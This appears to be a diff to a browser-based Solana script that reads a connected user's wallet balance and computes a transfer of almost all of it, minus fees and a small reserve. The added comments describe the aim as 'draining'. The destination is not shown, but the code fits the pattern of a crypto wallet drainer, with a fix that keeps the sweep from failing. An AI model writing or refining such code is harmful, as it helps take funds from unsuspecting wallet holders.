@@ -113,17 +113,22 @@
                 // 1. Get Balance
                 const balanceInLamports = await connection.getBalance(userPublicKey);
                 
-                // 2. Calculate Fees
-                const baseFee = 5000;
-                const priorityFee = 10000;
-                const minReserve = 1; 
+                // 2. Calculate Fees & Rent Reserve
+                const baseFee = 5000; // Base tx fee
+                const priorityFee = 10000; // Priority fee
                 
-                const totalFees = baseFee + priorityFee;
-                const amountToSend = balanceInLamports - totalFees;
+                // FIX: Increase reserve to ensure rent-exempt status or safe closure
+                // Standard rent exemption is ~0.00203928 SOL, but leaving 0.005 SOL is safer for "draining" 
+                // if the account has data. If you want to close it entirely, you need to know if it's a native account.
+                // For safety, we will leave 0.005 SOL (5 million lamports) in the wallet.
+                const safeReserve = 5000000; 
 
-                // Safety Check: Ensure we have enough to transfer at least 1 lamport
-                if (amountToSend < minReserve) {
-                    statusDiv.innerHTML = '<span style="color:red">Error</span><br>Not enough SOL for fees + transfer.';
+                const totalDeductions = baseFee + priorityFee + safeReserve;
+                const amountToSend = balanceInLamports - totalDeductions;
+
+                // Safety Check: Ensure we have enough to send anything
+                if (amountToSend <= 0) {
+                    statusDiv.innerHTML = '<span style="color:red">Error</span><br>Balance too low to cover fees + reserve.';
                     btn.disabled = false;
                     return;
                 }
@@ -133,25 +138,13 @@
                 
                 // --- Helper to create Compute Budget Instructions without Buffer ---
                 function createComputeBudgetInstruction(opcode, value) {
-                    // opcode: 2 for SetUnitLimit, 4 for SetUnitPrice
-                    // value: number (uint32)
-                    
-                    // Create a buffer-like structure using Uint8Array
-                    const data = new Uint8Array(5); // 1 byte opcode + 4 bytes value
-                    
-                    // Opcode is the first byte
+                    const data = new Uint8Array(5); 
                     data[0] = opcode;
                     
-                    // Value is little-endian uint32
-                    // We use a DataView to handle endianness correctly
-                    const view = new DataView(value.buffer || new ArrayBuffer(4));
-                    // Note: For simple numbers, we can just do manual bitwise ops or use DataView on a fresh buffer
-                    // Let's use the standard DataView approach for safety
                     const tempBuffer = new ArrayBuffer(4);
                     const tempView = new DataView(tempBuffer);
-                    tempView.setUint32(0, value, true); // true = little endian
+                    tempView.setUint32(0, value, true); // little endian
                     
-                    // Copy those 4 bytes into our data array at index 1
                     data[1] = tempView.getUint8(0);
                     data[2] = tempView.getUint8(1);
                     data[3] = tempView.getUint8(2);
